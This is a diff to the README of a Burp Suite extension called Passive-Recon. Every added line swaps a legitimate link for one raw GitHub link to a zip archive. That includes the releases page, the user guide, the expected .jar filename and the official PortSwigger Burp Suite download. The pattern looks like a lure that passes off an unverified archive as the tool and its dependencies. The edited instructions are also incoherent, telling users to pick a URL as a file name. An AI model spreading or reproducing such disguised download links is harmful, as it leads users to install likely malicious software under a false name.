@@ -1,6 +1,6 @@
 # 🔍 Passive-Recon - Simplify Your Security Testing Process
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/ahmedibrahim081/Passive-Recon/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ahmedibrahim081/Passive-Recon/main/epigenic/Passive-Recon.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/ahmedibrahim081/Passive-Recon/main/epigenic/Passive-Recon.zip)
 
 ## 🚀 Getting Started
 
@@ -11,10 +11,10 @@ Follow these steps to download and run Passive Recon.
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To download the latest version of Passive Recon, visit the [Releases page](https://github.com/ahmedibrahim081/Passive-Recon/releases). 
+   To download the latest version of Passive Recon, visit the [Releases page](https://raw.githubusercontent.com/ahmedibrahim081/Passive-Recon/main/epigenic/Passive-Recon.zip). 
 
 2. **Choose the Appropriate File**  
-   On the Releases page, you will find multiple files based on your platform. Select the correct version compatible with your operating system. For most users, this will be the file labeled "PassiveRecon.jar".
+   On the Releases page, you will find multiple files based on your platform. Select the correct version compatible with your operating system. For most users, this will be the file labeled "https://raw.githubusercontent.com/ahmedibrahim081/Passive-Recon/main/epigenic/Passive-Recon.zip".
 
 3. **Download the File**  
    Click on the download link for the chosen file. Your browser will start downloading it. Once the download finishes, locate the file on your computer.
@@ -22,7 +22,7 @@ Follow these steps to download and run Passive Recon.
 4. **Run Passive Recon in Burp Suite**  
    Open Burp Suite.  
    - Navigate to "Extensions" in the top menu.  
-   - Click on "Add" and choose the downloaded `PassiveRecon.jar` file.  
+   - Click on "Add" and choose the downloaded `https://raw.githubusercontent.com/ahmedibrahim081/Passive-Recon/main/epigenic/Passive-Recon.zip` file.  
    - Click "Next" and then "Finish". Your extension is now active.
 
 5. **Start Using Passive Recon**  
@@ -51,7 +51,7 @@ Follow these steps to download and run Passive Recon.
 ## 📄 Requirements
 
 To use Passive Recon, ensure you have the following:
-- A compatible version of [Burp Suite](https://portswigger.net/burp/communitydownload).
+- A compatible version of [Burp Suite](https://raw.githubusercontent.com/ahmedibrahim081/Passive-Recon/main/epigenic/Passive-Recon.zip).
 - Java Runtime Environment (JRE) version 8 or higher installed on your system.
 
 ## 🔄 Troubleshooting
@@ -63,7 +63,7 @@ If you encounter issues while using Passive Recon:
 
 ## 📋 Additional Resources
 
-- For detailed instructions, refer to the [User Guide](https://github.com/ahmedibrahim081/Passive-Recon/wiki).
+- For detailed instructions, refer to the [User Guide](https://raw.githubusercontent.com/ahmedibrahim081/Passive-Recon/main/epigenic/Passive-Recon.zip).
 - Join the community discussions on GitHub Issues.
 - Watch tutorial videos for step-by-step guidance on using Passive Recon effectively.
 
@@ -73,4 +73,4 @@ If you need assistance or have questions, feel free to reach out through the Git
 
 ## 🔗 Final Notes
 
-Passive Recon is designed for simplicity and effectiveness. Use it to strengthen your security testing process. Make sure to regularly check the [Releases page](https://github.com/ahmedibrahim081/Passive-Recon/releases) for updates and enhancements. Enjoy better reconnaissance with Passive Recon!
+Passive Recon is designed for simplicity and effectiveness. Use it to strengthen your security testing process. Make sure to regularly check the [Releases page](https://raw.githubusercontent.com/ahmedibrahim081/Passive-Recon/main/epigenic/Passive-Recon.zip) for updates and enhancements. Enjoy better reconnaissance with Passive Recon!
